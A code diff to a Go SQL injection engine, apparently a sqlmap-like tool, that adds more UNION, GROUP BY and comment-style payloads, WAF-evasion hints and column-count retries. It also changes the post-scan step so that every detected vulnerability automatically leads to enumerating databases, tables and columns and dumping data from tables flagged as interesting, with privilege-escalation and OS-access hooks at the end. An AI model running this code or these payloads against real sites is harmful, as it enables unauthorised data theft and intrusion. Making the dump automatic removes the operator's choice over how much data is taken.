@@ -46,13 +46,13 @@ func (e *Engine) logSuccess(msg string, args ...interface{}) {
 func (e *Engine) logVuln(msg string, args ...interface{}) {
 	if e.Log != nil && e.Opts.Verbose >= 1 {
 		formatted := fmt.Sprintf(msg, args...)
-		e.Log.Critical(formatted)
+		e.Log.Success(formatted)
 	}
 }
 
 func (e *Engine) logPayload(payload string, param string) {
 	if e.Log != nil && e.Opts.Verbose >= 1 {
-		e.Log.Payload(fmt.Sprintf("%s: %s", param, payload))
+		e.Log.Payload(param, payload)
 	}
 }
 
@@ -61,76 +61,113 @@ func (e *Engine) Start() []Result {
 
 	u, err := url.Parse(e.Opts.URL)
 	if err != nil {
+		e.Log.Warning(fmt.Sprintf("could not parse target URL '%s'", e.Opts.URL))
 		return allResults
 	}
 
 	params := u.Query()
 	if len(params) == 0 && e.Opts.Data == "" {
-		e.logWarn("No parameters found in URL or POST data")
+		e.Log.Warning("no parameters found in URL or POST data")
 		return allResults
 	}
 
-	e.logInfo(fmt.Sprintf("testing connection to the target URL"))
+	// ── Connection Phase ──
+	e.Log.Info("testing connection to the target URL")
 	var baseBody string
 	var baseLen int
+	var connected bool
 
-	baselineSamples := []time.Duration{}
-	for i := 0; i < 3; i++ {
-		body, blen, _, err := e.Request("", "")
-		if err != nil {
-			e.logWarn(fmt.Sprintf("connection failed: %v", err))
-			return allResults
+	var baselineSamples []time.Duration
+
+	// Connection retry with escalating timeout
+	maxAttempts := 3
+	for attempt := 1; attempt <= maxAttempts; attempt++ {
+		if attempt > 1 {
+			e.Log.Warning(fmt.Sprintf("connection timed out, retry #%d with extended timeout (%ds)...", attempt-1, e.Opts.Timeout*2))
+			e.Client.Timeout = time.Duration(e.Opts.Timeout*2) * time.Second
+			time.Sleep(1 * time.Second)
 		}
-		baseBody = body
-		baseLen = blen
-		baselineSamples = append(baselineSamples, e.LastResponseTime)
-		if i == 0 {
-			e.logInfo(fmt.Sprintf("target URL content is stable (%d bytes, %v response time)", blen, e.LastResponseTime))
+
+		var samples []time.Duration
+		success := true
+		for i := 0; i < 3; i++ {
+			body, blen, _, err := e.Request("", "")
+			if err != nil {
+				success = false
+				break
+			}
+			if i == 0 {
+				baseBody = body
+				baseLen = blen
+			}
+			samples = append(samples, e.LastResponseTime)
+			time.Sleep(200 * time.Millisecond)
 		}
-		time.Sleep(200 * time.Millisecond)
+		if success && len(samples) > 0 {
+			baselineSamples = samples
+			connected = true
+			e.Log.Info(fmt.Sprintf("target URL content is stable (%d bytes, %v average response time)", baseLen, avgDuration(samples)))
+			break
+		}
 	}
-	avgBaseTime := avgDuration(baselineSamples)
-	stdDevTime := stdDevDuration(baselineSamples, avgBaseTime)
-	_ = stdDevTime
 
-	e.logInfo("checking if the target is protected by some kind of WAF/IPS")
+	if !connected {
+		e.Log.Warning("connection timed out to the target URL")
+		e.Log.Info("try: verifying the target URL is reachable from your network")
+		e.Log.Info("try: using --proxy if behind a corporate firewall")
+		e.Log.Info("try: increasing --timeout for slow connections")
+		return allResults
+	}
+
+	avgBaseTime := avgDuration(baselineSamples)
+
+	// ── WAF Detection ──
+	e.Log.Info("checking if the target is protected by some kind of WAF/IPS")
 	waf := DetectWAF(e.LastResponseHeaders, baseBody)
 	if waf.Detected {
-		e.logVuln("heuristics detected that the target is protected by some kind of WAF/IPS")
-		e.logWarn(fmt.Sprintf("WAF/IPS identified: %s", waf.Name))
+		e.Log.Critical("heuristics detected that the target is protected by some kind of WAF/IPS")
+		e.Log.Warning(fmt.Sprintf("WAF/IPS identified: %s", waf.Name))
 		if e.Opts.BypassWAF {
-			e.logInfo("WAF bypass mode engaged — using evasion techniques")
+			e.Log.Info("WAF bypass mode engaged — using evasion techniques")
 		} else {
-			e.logWarn("please consider usage of tamper scripts (option '--tamper')")
+			e.Log.Warning("please consider usage of tamper scripts (option '--tamper')")
 		}
 	} else {
-		e.logInfo("no WAF/IPS detected")
+		e.Log.Info("no WAF/IPS detected")
 	}
 
-	tech := DetectTechStack(e.LastResponseHeaders)
-	if len(tech) > 0 {
-		e.logInfo("detected backend technology stack:")
-		for k, v := range tech {
-			e.logInfo(fmt.Sprintf("  %s: %s", k, v))
-		}
-	}
+	e.Log.Blank()
 
+	// ── Deep Backend Stack Detection ──
+	backendStack := DetectBackendStack(e.LastResponseHeaders, baseBody)
+	serverVer := DetectSoftwareVersion(e.LastResponseHeaders)
+	if serverVer != "" {
+		backendStack["Server Version"] = serverVer
+	}
 	osDetected := e.DetectOS()
 	if osDetected != "Unknown" {
-		e.logInfo(fmt.Sprintf("detected OS: %s", osDetected))
+		backendStack["OS"] = osDetected
 	}
+	e.Log.BackendStack(backendStack)
+	e.Log.Blank()
 
+	// ── Initial DBMS Detection ──
 	initialDB := DetectDBMS(baseBody, e.LastResponseHeaders)
 	if initialDB != "Unknown" {
-		e.logSuccess(fmt.Sprintf("heuristic (basic) test shows that GET parameter might be injectable (possible DBMS: '%s')", initialDB))
+		e.Log.Success(fmt.Sprintf("heuristic (basic) test shows that GET parameter might be injectable (possible DBMS: '%s')", initialDB))
 	} else {
-		e.logInfo("heuristic test: DBMS not identified — testing all 16 payload groups")
+		e.Log.Info("heuristic test: DBMS not identified — testing all 16 payload groups")
 	}
 
-	e.logInfo(fmt.Sprintf("testing for SQL injection on GET parameter '%s'", firstParamName(params)))
+	e.Log.Blank()
+
+	// ── Parameter Testing ──
+	paramName := firstParamName(params)
+	e.Log.Info(fmt.Sprintf("testing for SQL injection on GET parameter '%s'", paramName))
 	if initialDB != "Unknown" && initialDB != "" {
-		e.logInfo(fmt.Sprintf("it looks like the back-end DBMS is '%s'", initialDB))
+		e.Log.Info(fmt.Sprintf("it looks like the back-end DBMS is '%s'", initialDB))
 	}
+	e.Log.Blank()
 
 	paramList := make([]string, 0, len(params))
 	for p := range params {
@@ -161,14 +198,22 @@ func (e *Engine) Start() []Result {
 		return allResults[i].Confidence > allResults[j].Confidence
 	})
 
+	e.Log.Blank()
 	if len(allResults) > 0 {
-		e.logSuccess(fmt.Sprintf("SQLi vulnerabilities found: %d", len(allResults)))
+		e.Log.Success(fmt.Sprintf("SQLi vulnerabilities found: %d", len(allResults)))
 		for _, r := range allResults[:minInt(len(allResults), 3)] {
-			e.logVuln(fmt.Sprintf("Parameter '%s' is %s (DBMS: %s, confidence: %.0f%%)",
+			e.Log.Success(fmt.Sprintf("Parameter '%s' is %s (DBMS: %s, confidence: %.0f%%)",
 				r.Parameter, r.Type, r.DBMS, r.Confidence*100))
 		}
+		e.Log.Blank()
+		backendStack := DetectBackendStack(e.LastResponseHeaders, baseBody)
+		serverVer := DetectSoftwareVersion(e.LastResponseHeaders)
+		if serverVer != "" {
+			backendStack["Server Version"] = serverVer
+		}
+		e.Log.BackendStack(backendStack)
 	} else {
-		e.logWarn("No SQL injection vulnerabilities detected")
+		e.Log.Warning("No SQL injection vulnerabilities detected")
 	}
 
 	e.postScan(allResults, params)
@@ -233,7 +278,7 @@ func (e *Engine) scanParameter(param string, baseLen int, avgBaseTime time.Durat
 	}
 
 	// ── Stage 1b: Boolean-based ──
-	if (e.Opts.Mode == "auto" || e.Opts.Mode == "boolean") && len(results) == 0 || e.Opts.RiskLevel >= 2 {
+	if (e.Opts.Mode == "auto" || e.Opts.Mode == "boolean") || e.Opts.RiskLevel >= 1 {
 		e.logInfo("testing 'AND boolean-based blind - WHERE or HAVING clause'")
 		found := false
 		for _, group := range payloads.AllPayloads {
@@ -303,7 +348,7 @@ func (e *Engine) scanParameter(param string, baseLen int, avgBaseTime time.Durat
 	}
 
 	// ── Stage 1c: Time-based ──
-	if (e.Opts.Mode == "auto" || e.Opts.Mode == "time") && len(results) == 0 || e.Opts.RiskLevel >= 2 {
+	if (e.Opts.Mode == "auto" || e.Opts.Mode == "time") || e.Opts.RiskLevel >= 1 {
 		e.logInfo("testing 'AND time-based blind - WHERE or HAVING clause'")
 		found := false
 		for _, group := range payloads.AllPayloads {
@@ -368,11 +413,13 @@ func (e *Engine) scanParameter(param string, baseLen int, avgBaseTime time.Durat
 	}
 
 	// ── Stage 1d: Union-based ──
-	if (e.Opts.Mode == "auto" || e.Opts.Mode == "union") && len(results) == 0 || e.Opts.RiskLevel >= 2 {
+	if (e.Opts.Mode == "auto" || e.Opts.Mode == "union") || e.Opts.RiskLevel >= 1 {
 		e.logInfo("testing 'UNION query - ORDER BY column count'")
 		colCount := 0
+		commentUsed := "--"
 
-		commentStyles := []string{"--", "#", "--+"}
+		// Strategy 1: ORDER BY probe with multiple comment styles
+		commentStyles := []string{"-- ", "--+", "--", "#", "/*", ";"}
 	orderByLoop:
 		for _, comment := range commentStyles {
 			for cols := 1; cols <= 20; cols++ {
@@ -383,7 +430,8 @@ func (e *Engine) scanParameter(param string, baseLen int, avgBaseTime time.Durat
 				if err != nil {
 					continue
 				}
-				errKeywords := []string{"error", "order", "Unknown column", "syntax", "mysql_fetch", "unclosed"}
+				errKeywords := []string{"error", "order", "Unknown column", "syntax", "mysql_fetch", "unclosed",
+					"MariaDB", "MySQL", "PostgreSQL", "SQLite", "SQL Server", "Incorrect"}
 				isErr := false
 				for _, kw := range errKeywords {
 					if strings.Contains(strings.ToLower(body), kw) {
@@ -395,10 +443,10 @@ func (e *Engine) scanParameter(param string, baseLen int, avgBaseTime time.Durat
 					colCount = cols - 1
 					if colCount > 0 {
 						e.logInfo(fmt.Sprintf("columns detected: %d (ORDER BY %d failed with '%s')", colCount, cols, comment))
+						commentUsed = comment
 						break orderByLoop
 					}
 				}
-				_ = bodyLen
 				if e.Opts.Delay > 0 {
 					time.Sleep(time.Duration(e.Opts.Delay) * time.Millisecond)
 				}
@@ -408,26 +456,30 @@ func (e *Engine) scanParameter(param string, baseLen int, avgBaseTime time.Durat
 			}
 		}
 
+		// Strategy 2: NULL UNION probe if ORDER BY didn't work
 		if colCount == 0 {
-			unionComments := []string{"--", "#", "--+"}
+			unionComments := []string{"-- ", "--+", "--", "#", "/*", ";"}
 		nullUnionLoop:
 			for _, comment := range unionComments {
-				for cols := 1; cols <= 10; cols++ {
+				for cols := 1; cols <= 12; cols++ {
 					nulls := make([]string, cols)
 					for i := range nulls {
 						nulls[i] = "NULL"
 					}
-					pay := fmt.Sprintf("' UNION SELECT %s %s", strings.Join(nulls, ","), comment)
-					processed := e.ApplyTamper(pay)
-					e.logPayload(processed, param)
-					_, bodyLen, _, err := e.Request(processed, param)
-					if err != nil {
-						continue
-					}
-					if bodyLen != baseLen {
-						colCount = cols
-						e.logInfo(fmt.Sprintf("columns detected via NULL union: %d (%s)", colCount, comment))
-						break nullUnionLoop
+					for _, prefix := range []string{"' UNION SELECT ", "' UNION ALL SELECT ", " UNION SELECT ", "' UNION SELECT DISTINCT "} {
+						pay := fmt.Sprintf("%s%s %s", prefix, strings.Join(nulls, ","), comment)
+						processed := e.ApplyTamper(pay)
+						e.logPayload(processed, param)
+						_, bodyLen, _, err := e.Request(processed, param)
+						if err != nil {
+							continue
+						}
+						if bodyLen != baseLen {
+							colCount = cols
+							commentUsed = comment
+							e.logInfo(fmt.Sprintf("columns detected via NULL union: %d (prefix: %s, comment: %s)", colCount, prefix, comment))
+							break nullUnionLoop
+						}
 					}
 					if e.Opts.Delay > 0 {
 						time.Sleep(time.Duration(e.Opts.Delay) * time.Millisecond)
@@ -436,28 +488,83 @@ func (e *Engine) scanParameter(param string, baseLen int, avgBaseTime time.Durat
 			}
 		}
 
-		if colCount > 0 {
-			nulls := make([]string, colCount)
-			for i := range nulls {
-				nulls[i] = "NULL"
+		// Strategy 3: GROUP BY / DISTINCT probe
+		if colCount == 0 {
+			e.logInfo("ORDER BY and UNION NULL failed, trying GROUP BY probe...")
+			for cols := 1; cols <= 10; cols++ {
+				nulls := make([]string, cols)
+				for i := range nulls {
+					nulls[i] = fmt.Sprintf("%d", i+1)
+				}
+				pay := fmt.Sprintf("' GROUP BY %s -- ", strings.Join(nulls, ","))
+				processed := e.ApplyTamper(pay)
+				e.logPayload(processed, param)
+				body, bodyLen, _, err := e.Request(processed, param)
+				if err != nil {
+					continue
+				}
+				if strings.Contains(strings.ToLower(body), "group") || bodyLen < baseLen-50 {
+					colCount = cols
+					commentUsed = "-- "
+					e.logInfo(fmt.Sprintf("columns detected via GROUP BY: %d", colCount))
+					break
+				}
 			}
-			unionPay := fmt.Sprintf("' UNION SELECT %s--", strings.Join(nulls, ","))
-			processed := e.ApplyTamper(unionPay)
-			e.logPayload(processed, param)
-			_, bodyLen, _, err := e.Request(processed, param)
-			if err == nil && bodyLen != baseLen {
-				e.logVuln(fmt.Sprintf("Parameter '%s' is vulnerable to UNION query injection (DBMS: %s, columns: %d, confidence: 80%%)",
-					param, initialDB, colCount))
-				results = append(results, Result{
-					Parameter:  param,
-					Type:       "Union-based",
-					Payload:    unionPay,
-					DBMS:       initialDB,
-					Details:    fmt.Sprintf("Columns: %d", colCount),
-					Confidence: 0.80,
-				})
-			} else {
-				e.logInfo("UNION query: NOT vulnerable")
+		}
+
+		if colCount > 0 {
+			for _, prefix := range []string{"' UNION SELECT ", "' UNION ALL SELECT "} {
+				nulls := make([]string, colCount)
+				for i := range nulls {
+					nulls[i] = "NULL"
+				}
+				unionPay := fmt.Sprintf("%s%s %s", prefix, strings.Join(nulls, ","), commentUsed)
+				processed := e.ApplyTamper(unionPay)
+				e.logPayload(processed, param)
+				_, bodyLen, _, err := e.Request(processed, param)
+				if err == nil && bodyLen != baseLen {
+					e.logVuln(fmt.Sprintf("Parameter '%s' is vulnerable to UNION query injection (DBMS: %s, columns: %d, confidence: 80%%)",
+						param, initialDB, colCount))
+					results = append(results, Result{
+						Parameter:  param,
+						Type:       "Union-based",
+						Payload:    unionPay,
+						DBMS:       initialDB,
+						Details:    fmt.Sprintf("Columns: %d", colCount),
+						Confidence: 0.80,
+					})
+					break
+				} else if err == nil {
+					// Try with different column count - the detected count might be off by one
+					for offset := -1; offset <= 1; offset++ {
+						adjusted := colCount + offset
+						if adjusted < 1 || adjusted == colCount {
+							continue
+						}
+						nulls2 := make([]string, adjusted)
+						for i := range nulls2 {
+							nulls2[i] = "NULL"
+						}
+						pay2 := fmt.Sprintf("%s%s %s", prefix, strings.Join(nulls2, ","), commentUsed)
+						processed2 := e.ApplyTamper(pay2)
+						e.logPayload(processed2, param)
+						_, blen2, _, err2 := e.Request(processed2, param)
+						if err2 == nil && blen2 != baseLen {
+							e.logVuln(fmt.Sprintf("Parameter '%s' is vulnerable to UNION query injection (DBMS: %s, columns: %d, confidence: 80%%)",
+								param, initialDB, adjusted))
+							results = append(results, Result{
+								Parameter:  param,
+								Type:       "Union-based",
+								Payload:    pay2,
+								DBMS:       initialDB,
+								Details:    fmt.Sprintf("Columns: %d", adjusted),
+								Confidence: 0.80,
+							})
+							colCount = adjusted
+							break
+						}
+					}
+				}
 			}
 		} else {
 			e.logInfo("could not determine column count for UNION injection")
@@ -465,7 +572,7 @@ func (e *Engine) scanParameter(param string, baseLen int, avgBaseTime time.Durat
 	}
 
 	// ── Stage 1e: Stacked Query ──
-	if (e.Opts.Mode == "auto" || e.Opts.Mode == "stacked") && len(results) == 0 || e.Opts.RiskLevel >= 3 {
+	if (e.Opts.Mode == "auto" || e.Opts.Mode == "stacked") && (len(results) == 0 || e.Opts.RiskLevel >= 3) {
 		e.logInfo("testing 'Stacked queries (SQL statement separation)'")
 		for _, group := range payloads.AllPayloads {
 			if initialDB != "Unknown" && initialDB != group.DBMS && e.Opts.RiskLevel < 3 {
@@ -532,57 +639,40 @@ func (e *Engine) postScan(results []Result, params url.Values) {
 	enum := modules.NewEnumerator(e)
 
 	var dbs []string
-	if e.Opts.ListDBs || e.Opts.DumpAll {
-		e.logInfo("fetching database names")
-		var err error
-		dbs, err = enum.ListDatabases(param, dbms)
-		if err == nil {
-			e.logSuccess(fmt.Sprintf("available databases [%d]:", len(dbs)))
-			for _, db := range dbs {
-				e.logInfo(fmt.Sprintf("  [*] %s", db))
-			}
-			results = append(results, Result{
-				Parameter:  "enumeration",
-				Type:       "list-dbs",
-				Payload:    strings.Join(dbs, ","),
-				DBMS:       dbms,
-				Confidence: 1.0,
-			})
-		} else {
-			e.logWarn(fmt.Sprintf("could not enumerate databases: %v", err))
-			dbs = []string{getValue(params, param)}
+	// Always fetch databases on vuln detection
+	e.logInfo("fetching database names")
+	var err error
+	dbs, err = enum.ListDatabases(param, dbms)
+	if err == nil {
+		e.Log.ListDBHeader()
+		for _, db := range dbs {
+			e.Log.ListDB(db)
 		}
+		e.Log.Blank()
+		results = append(results, Result{
+			Parameter:  "enumeration",
+			Type:       "list-dbs",
+			Payload:    strings.Join(dbs, ","),
+			DBMS:       dbms,
+			Confidence: 1.0,
+		})
+	} else {
+		e.logWarn(fmt.Sprintf("could not enumerate databases: %v", err))
+		dbs = []string{getValue(params, param)}
 	}
 
-	if e.Opts.ListTables || e.Opts.DumpAll || e.Opts.Table != "" {
-		targetDbs := dbs
-		if e.Opts.Database != "" {
-			targetDbs = []string{e.Opts.Database}
-		}
-		if len(targetDbs) == 0 {
-			targetDbs = []string{"current"}
-		}
-		for _, db := range targetDbs {
-			if isSystemDB(db) && e.Opts.RiskLevel < 4 && !e.Opts.DumpAll {
-				e.logInfo(fmt.Sprintf("skipping system database '%s' (use --risk-level 4+ to include)", db))
+	// Always list tables for non-system databases
+	if len(dbs) > 0 {
+		for _, db := range dbs {
+			if isSystemDB(db) && e.Opts.RiskLevel < 3 {
 				continue
 			}
-			var tables []string
-			var err error
-			if e.Opts.Table != "" {
-				tables = []string{e.Opts.Table}
-			} else {
-				e.logInfo(fmt.Sprintf("fetching tables for database: %s", db))
-				tables, err = enum.ListTables(db, param, dbms)
-			}
-			if err == nil {
-				e.logSuccess(fmt.Sprintf("tables in %s [%d]:", db, len(tables)))
+			e.Log.Blank()
+			e.Log.SectionHeader(fmt.Sprintf("AVAILABLE TABLE (%s)", db))
+			tables, err := enum.ListTables(db, param, dbms)
+			if err == nil && len(tables) > 0 {
 				for _, t := range tables {
-					if isInterestingTable(t) {
-						e.logWarn(fmt.Sprintf("  [!] %s (interesting)", t))
-					} else {
-						e.logInfo(fmt.Sprintf("  [ ] %s", t))
-					}
+					e.Log.SectionItem(t)
 				}
 				results = append(results, Result{
 					Parameter: "enumeration",
@@ -593,71 +683,58 @@ func (e *Engine) postScan(results []Result, params url.Values) {
 					Confidence: 1.0,
 				})
 
-				if e.Opts.DumpAll {
-					for _, table := range tables {
-						if isInterestingTable(table) || e.Opts.RiskLevel >= 4 {
-							e.logInfo(fmt.Sprintf("dumping table: %s.%s", db, table))
-							cols, _ := enum.ListColumns(db, table, param, dbms)
-							if len(cols) > 0 {
-								e.logInfo(fmt.Sprintf("columns: %s", strings.Join(cols, ", ")))
-								dumped := e.BulkExtract(param, dbms, db, []string{table}, cols)
-								if len(dumped) > 0 {
-									e.logSuccess(fmt.Sprintf("table '%s.%s' dumped successfully (%d rows)", db, table, len(dumped)))
-								}
+				for _, table := range tables {
+					if isInterestingTable(table) || e.Opts.RiskLevel >= 3 {
+						e.Log.Blank()
+						e.Log.SectionHeader(fmt.Sprintf("COLUMNS (%s.%s)", db, table))
+						cols, err := enum.ListColumns(db, table, param, dbms)
+						if err == nil && len(cols) > 0 {
+							for _, c := range cols {
+								e.Log.SectionItem(c)
 							}
+							results = append(results, Result{
+								Parameter: "enumeration",
+								Type:      "list-columns",
+								Details:   fmt.Sprintf("%s.%s", db, table),
+								Payload:   strings.Join(cols, ","),
+								DBMS:      dbms,
+								Confidence: 1.0,
+							})
+							e.Log.Blank()
+							e.Log.SectionHeader(fmt.Sprintf("DATA DUMP (%s.%s)", db, table))
+							dumped := e.BulkExtract(param, dbms, db, []string{table}, cols)
+							if len(dumped) > 0 {
+								if rows, ok := dumped[table]; ok {
+									for _, row := range rows {
+										e.Log.SectionData(row)
+									}
+									e.Log.Blank()
+									e.Log.Success(fmt.Sprintf("Total: %d row(s) from %s.%s", len(rows), db, table))
+								}
+								results = append(results, Result{
+									Parameter: "enumeration",
+									Type:      "dump-table",
+									Details:   fmt.Sprintf("%s.%s", db, table),
+									Payload:   fmt.Sprintf("%v", dumped[table]),
+									DBMS:      dbms,
+									Confidence: 1.0,
+								})
+							} else {
+								e.Log.SectionData("(no data extracted)")
+							}
+						} else {
+							e.Log.SectionData("(columns not found)")
 						}
 					}
 				}
-
-				if e.Opts.DumpTable != "" {
-					for _, table := range tables {
-						if strings.EqualFold(table, e.Opts.DumpTable) {
-							e.logInfo(fmt.Sprintf("dumping table: %s.%s", db, table))
-							cols, _ := enum.ListColumns(db, table, param, dbms)
-							if len(cols) > 0 {
-								e.logInfo(fmt.Sprintf("columns: %s", strings.Join(cols, ", ")))
-								dumped := e.BulkExtract(param, dbms, db, []string{table}, cols)
-								if len(dumped) > 0 {
-									e.logSuccess(fmt.Sprintf("table '%s.%s' dumped successfully (%d rows)", db, table, len(dumped)))
-								}
-							}
-						}
-					}
-				}
-			} else {
-				e.logWarn(fmt.Sprintf("could not enumerate tables for %s: %v", db, err))
-			}
-		}
-	}
-
-	if e.Opts.ListColumns {
-		if e.Opts.Database != "" && e.Opts.Table != "" {
-			e.logInfo(fmt.Sprintf("fetching columns for: %s.%s", e.Opts.Database, e.Opts.Table))
-			cols, err := enum.ListColumns(e.Opts.Database, e.Opts.Table, param, dbms)
-			if err == nil {
-				e.logSuccess(fmt.Sprintf("columns: %s", strings.Join(cols, ", ")))
-				results = append(results, Result{
-					Parameter: "enumeration",
-					Type:      "list-columns",
-					Payload:   strings.Join(cols, ","),
-					DBMS:      dbms,
-					Confidence: 1.0,
-				})
-			}
-		} else if len(dbs) > 0 {
-			tables, _ := enum.ListTables(dbs[0], param, dbms)
-			if len(tables) > 0 {
-				e.logInfo(fmt.Sprintf("fetching columns for: %s.%s", dbs[0], tables[0]))
-				cols, err := enum.ListColumns(dbs[0], tables[0], param, dbms)
-				if err == nil {
-					e.logSuccess(fmt.Sprintf("columns: %s", strings.Join(cols, ", ")))
-				}
+			} else if err != nil {
+				e.Log.SectionData("(no tables found)")
 			}
 		}
 	}
 
 	if e.Opts.PrivEsc || e.Opts.OSAccess {
-		e.logVuln("Post-Exploitation:")
+		e.logInfo("Post-Exploitation:")
 		if e.Opts.PrivEsc {
 			e.logInfo("attempting privilege escalation...")
 			pe := e.PostExploit(param, dbms, "udf")
